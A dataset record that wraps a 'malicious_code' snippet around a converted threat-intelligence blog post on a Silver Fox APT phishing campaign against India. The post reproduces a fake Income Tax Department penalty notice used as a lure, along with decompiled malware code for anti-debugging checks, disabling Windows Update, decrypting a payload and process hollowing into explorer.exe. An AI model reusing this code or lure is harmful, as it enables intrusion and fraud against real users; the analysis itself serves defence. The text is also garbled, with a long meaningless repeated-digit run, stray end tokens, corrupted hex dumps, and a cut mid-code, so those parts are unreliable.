{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "lpBaseAddress = VirtualAllocEx( \nlpProcessInformation->hProcess, 0, \ndwSize, \nMEM_COMMIT | MEM_RESERVE, \nPAGE_EXECUTE_READWRITE);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: 